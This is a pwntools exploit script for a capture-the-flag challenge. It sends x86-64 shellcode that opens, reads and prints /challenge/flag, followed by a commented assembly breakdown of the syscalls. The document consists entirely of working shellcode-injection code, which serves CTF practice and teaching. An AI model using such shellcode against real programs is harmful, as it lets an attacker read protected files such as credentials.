from pwn import *

#r = gdb.debug("./open_read_write", gdbscript='''
#continue
#              ''')

r = process("./open_read_write")

input("wait")

r.sendline(b"\x48\x89\xC7\x48\xC7\xC0\x02\x00\x00\x00\x48\x83\xC7\x4E\x49\x89\xFE\x49\x83\xC6\x12\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00\x00\x4C\x89\xF6\x48\xC7\xC2\x30\x00\x00\x00\x0F\x05\x4C\x89\xF6\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC2\x30\x00\x00\x00\x0F\x05/challenge/flag\0")

r.interactive()


'''mov rdi, rax
mov rax, 0x02       open identifier
add rdi, 0x4e       points to the flag file
mov r14, rdi        copy rdi to r14
add r14, 0x12       r14 it will be used as a buffer to save the flag content
mov rsi, 0
syscall
mov rdi, rax        move fd of the file opened to rdi
mov rax, 0x00       read identifier
mov rsi, r14        where to read
mov rdx, 0x30       size of what to read
syscall
mov rsi, r14        buffer to write-> points to the part of the buffer containing the characters of the flag
mov rdi, 0x01       stdout fd
mov rax, 0x01       write identifier
mov rdx, 0x30       size to print
syscall'''
